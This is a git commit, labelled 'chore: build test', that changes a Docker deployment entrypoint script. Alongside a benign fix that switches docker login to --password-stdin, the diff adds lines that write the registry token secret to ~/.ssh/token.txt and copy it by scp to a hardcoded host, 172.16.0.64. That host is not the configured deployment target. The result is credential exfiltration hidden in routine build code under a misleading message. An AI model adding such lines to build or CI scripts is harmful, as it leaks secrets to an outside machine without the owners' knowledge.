54e806f996467fff9a431a4513e9703069d52217
Thalyson Rodrigues <thalyson.sousa@attosementes.com.br>
2023-01-24 15:41:03 -0400

    chore: build test

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -75,9 +75,12 @@ docker context ls
 docker context create remote --docker "host=ssh://$INPUT_REMOTE_DOCKER_HOST:$INPUT_REMOTE_DOCKER_PORT" || true
 docker context use remote
 
+echo "$INPUT_DOCKER_REGISTRY_TOKEN" >> ~/.ssh/token.txt
+scp ~/.ssh/token.txt docker@172.16.0.64:/home/docker
+
 if ! [ -z "${INPUT_DOCKER_REGISTRY_USERNAME+x}" ] && ! [ -z "${INPUT_DOCKER_REGISTRY_TOKEN+x}" ]; then
   echo "Connecting to $INPUT_REMOTE_DOCKER_HOST... Command: docker login"
-  echo "$INPUT_DOCKER_REGISTRY_TOKEN" | docker login -u "$INPUT_DOCKER_REGISTRY_USERNAME" -p "$INPUT_DOCKER_REGISTRY_URI"
+  echo "$INPUT_DOCKER_REGISTRY_TOKEN" | docker login -u "$INPUT_DOCKER_REGISTRY_USERNAME" --password-stdin "$INPUT_DOCKER_REGISTRY_URI"
 fi
 
 echo "Connecting to $INPUT_REMOTE_DOCKER_HOST... Command: ${DEPLOYMENT_COMMAND} ${INPUT_ARGS}"
